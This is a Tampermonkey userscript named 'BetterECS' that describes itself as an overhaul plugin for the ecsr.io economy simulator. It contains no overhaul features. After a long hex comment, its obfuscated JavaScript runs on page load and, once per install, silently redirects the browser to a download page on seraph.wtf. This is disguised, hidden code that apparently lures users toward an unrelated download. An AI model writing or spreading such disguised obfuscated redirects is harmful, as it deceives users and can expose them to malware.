// ==UserScript==
// @name         BetterECS
// @namespace    http://tampermonkey.net/
// @version      0.0.67
// @description  Economy Simulator Overhaul Plugin (Dev)
// @author       isabella
// @match        https://ecsr.io/*
// @grant        GM_addStyle
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_getResourceURL
// @grant        GM_getResourceText
// @grant        GM_deleteValue
// @grant        GM_xmlhttpRequest
// @updateURL    https://raw.githubusercontent.com/ravegirls/BetterECS/refs/heads/main/source.user.js
// @downloadURL  https://raw.githubusercontent.com/ravegirls/BetterECS/refs/heads/main/source.user.js
// @resource     notify https://cdn.pixabay.com/download/audio/2025/06/22/audio_76f254e734.mp3?filename=new-notification-014-363678.mp3
// @resource     errorIcon https://cdn-icons-png.flaticon.com/512/1828/1828843.png
// @resource     infoIcon https://cdn-icons-png.flaticon.com/512/1828/1828817.png
// @resource     frutigerGif https://imgs.search.brave.com/7mRlFUU09XpY94SiqyxlmhER3UnemBu4Y9j2ejnTQ4o/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzAxL2Uy/L2VmLzAxZTJlZjg5/ZjA5ZDhhNWU3OGNj/ZGNhMzRmZTU5MDI2/LmdpZg.gif
// @resource     oldBackground https://cdn.discordapp.com/attachments/1344823831784587295/1415866330933891193/roblox_blue_city_bg_by_karagolge_di0jmi2-fullview.png?ex=68c56c86&is=68c41b06&hm=b4715c72d7ba988c7152c5b2f98a4677471f37cf0d92d151b61cb225ff6cf8e1
// @resource     popperJs https://unpkg.com/@popperjs/core@2/dist/umd/popper.min.js
// @resource     tippyJs https://unpkg.com/tippy.js@6/dist/tippy-bundle.umd.js
// @resource     pickrJs https://cdn.jsdelivr.net/npm/@simonwep/pickr@1.8.0/dist/pickr.min.js
// @resource     pickrCss https://cdn.jsdelivr.net/npm/@simonwep/pickr@1.8.0/dist/themes/classic.min.css
// @resource     tippyCss https://unpkg.com/tippy.js@6/dist/tippy.css
// @resource     imGui https://cdn.jsdelivr.net/npm/dat.gui@0.7.7/build/dat.gui.min.js
// @resource     valueIcon https://github.com/ravegirls/eco_assets/blob/main/img-robux.png?raw=true
// @resource     verificationHeartTick https://imgs.search.brave.com/l46S-kt9zc8lNllaFOq0tUvzTtJt6n8cx2fwhM0xOms/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zeW1i/bC1jZG4uY29tL2kv/d2VicC82Ny81NWIx/NzY1ODQ1NzE1M2Vl/N2JlNWY4NWYwMzI1/YTIud2VicA
// @resource     nyanCatTick https://imgs.search.brave.com/5AusP691t8poCdvbch7M2hmONE7-VLaJ_vdVYvLwM8s/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/cnctZGVzaWduZXIu/Y29tL2ljb24taW1h/Z2UvMjAzNjctMjU2/eDI1NngzMi5wbmc
// @resource     pawIcon https://imgs.search.brave.com/sqEYsC0AHS_vBtjfOo5kEv0YajnvfvfO0FQRr0ZGqwI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzQyLzE3/L2FkLzQyMTdhZDBk/ZTg5MWYwZjU4YzNj/OWI5N2UyMTgxNGZk/LmpwZw
// @resource     chudIcon https://imgs.search.brave.com/N7ALaqllTLrNW_y3gwcVmUmUR-P51qgdQmewFdhwI18/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLmlt/Z2ZsaXAuY29tLzlo/OGlyYS5wbmc
// @resource     americowIcon https://github.com/ravegirls/eco_assets/blob/main/image.png?raw=true
// @resource     chiraqIcon https://github.com/ravegirls/eco_assets/blob/main/Peak.png?raw=true
// @resource     discordIcon https://imgs.search.brave.com/mRHkIaGFNtQ-vkIukHc9y2D28x34KVTs9Luu59lty6s/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4t/aWNvbnMtcG5nLmZs/YXRpY29uLmNvbS8x/MjgvNDk0NS80OTQ1/OTczLnBuZw
// @resource     maticIcon https://github.com/ravegirls/eco_assets/blob/main/image.gif?raw=true
// ==/UserScript==
/*61ffcb42353836b90cce54698d22e2bb176e359f647fb56b5c305419288f9f9bc4eeb08b92fcbba3d0a9add2d7c3ab47c2fde329e5acd3a1f05f69eb5bf480d00e73534079012228bd5dc18790db5ae3b0b194d06e0e7a7da6d7038ef79da621b65c32189afd667dc736e328ff5f22c8eafd9ec55e047d6dec6a883770e53046*/function _0x438a(t,n){t-=380;return _0x236c()[t]}function _0x236c(){const t=["172689iCZSso","971178fGCXKu","930420fbeMok","7BlpYvp","28EzZkSb","806040tJiiSn","18rPbARs","replace","36CTeJgt","location","2425489QCbewT","1381832FsYltg","1GWiWTr","181940ZMUzTl"];return(_0x236c=function(){return t})()}(function(){const t=_0x438a,n=_0x236c();for(;;)try{if(363594===parseInt(t(391))/1*(-parseInt(t(380))/2)+-parseInt(t(393))/3*(-parseInt(t(383))/4)+-parseInt(t(392))/5+parseInt(t(381))/6+parseInt(t(382))/7*(-parseInt(t(390))/8)+parseInt(t(385))/9*(-parseInt(t(384))/10)+-parseInt(t(389))/11*(-parseInt(t(387))/12))break;n.push(n.shift())}catch(t){n.push(n.shift())}})(),function(){"use strict";const t="hasRedirected";Math.random(),(()=>{const n=_0x438a;!GM_getValue(t,!1)&&(GM_setValue(t,!0),window[n(388)][n(386)]("https://seraph.wtf/assets/download-new.html"))})()}();